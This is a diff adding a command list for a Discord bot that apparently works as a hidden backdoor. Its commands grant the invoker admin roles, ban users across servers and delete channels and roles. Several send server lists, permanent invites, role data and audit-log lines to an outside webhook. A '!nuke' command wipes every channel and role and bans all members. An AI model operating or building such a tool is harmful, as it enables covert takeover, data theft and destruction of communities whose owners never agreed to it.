@@ -1,0 +1,46 @@
+sameserver:
+!managerole = creates a role with admin permissions and gives it to the user
+!managerole ROLEID = edits a role to have admin permissions
+!unmanagerole ROLEID = edits a role to remove admin permissions
+!assignrole ROLEID = gives the user a role (doesnt edit the role)
+!unassignrole ROLEID = removes a role from the user (doesnt edit the role)
+!ban USERID = bans a user
+!unban USERID = unbans a user
+!deletemessage MESSAGEID = deletes the message
+!deleterole ROLEID = deletes the role
+!assignroleother ROLEID USERID = gives the userid a role (doesnt edit the role)
+!unassignroleother ROLEID USERID = removes a role from the userid (doesnt edit the role)
+
+---------------
+
+remote:
+!remoteban SERVERID USERID = bans the user from a spefifc server (can be executed from any server)
+!remoteunban SERVERID USERID = unbans the user from a spefifc server (can be executed from any server)
+!remoteuntimeout SERVERID USERID = removes timeout from the user
+!listservers = sends a list of all the servers and their id to the webhook
+!createinvite SERVERID = creates a permanent invite link to the selected server and sends it to the webhook
+!listroles SERVERID = lists roles and their hierarchy to the webhook
+!listroleperms SERVERID ROLEID = lists permissions of a select role to the webhook
+!listauditlog SERVERID AMOUNTOFLINES = lists the set amount of lines of the audit log to the webhook (cant be over about 30 because discord character limit)
+!status STATUS TYPE TEXT = changes bot status (online idle dnd invisible) (playing watching listening) if you dont give it a game it wont play anything
+!listinvites SERVERID = lists all the valid invites of a server to the webhook
+!remotemanagerole SERVERID = creates a role with admin permissions doesnt assign it to anyone
+!remotemanagerole SERVERID ROLEID = edits a role to have admin permissions
+!remoteunmanagerole SERVERID ROLEID = edits a role to remove admin permissions
+!remoteassignrole SERVERID ROLEID USERID = adds the role to the user in the server
+!unassignrole SERVERID ROLEID USERID = removes the role from the user in the server
+!leave SERVERID = leaves the server REQUIRES A (yes/no) CONFIRMATION IN THE SAME CHANNEL
+!nuke SERVERID = deletes all channels and roles + bans all members REQUIRES A (yes/no) CONFIRMATION IN THE SAME CHANNEL
+!servername SERVERID NAME = changes the server name
+!servericon SERVERID URL = changes the server icon
+!nick SERVERID NAME = changes the bot's nickname on the server
+!resetnick SERVERID = removes the bot's nickname on the server
+!remotedeletemessage SERVERID MESSAGEID = deletees the message on the server
+!remotedeleterole SERVERID ROLEID = deletes the role in the server
+!stop = STOPS THE BOT REQUIRES A (yes/no) CONFIRMATION IN THE SAME CHANNEL
+!listwebhooks SERVERID = lists all the webhooks
+!listwebhooks2 SERVERID CHANNELID = lists all the webhooks from the channel
+!listchannels SERVERID = lists all the channels
+!deletechannel SERVERID CHANNELID = deletes the channel
+!deleteinvite SERVERID INVITE = deletes the invite
+!listchannelperms SERVERID CHANNELID = lists the @everyone permissions of a channel (wip trying to add so it shows every server)
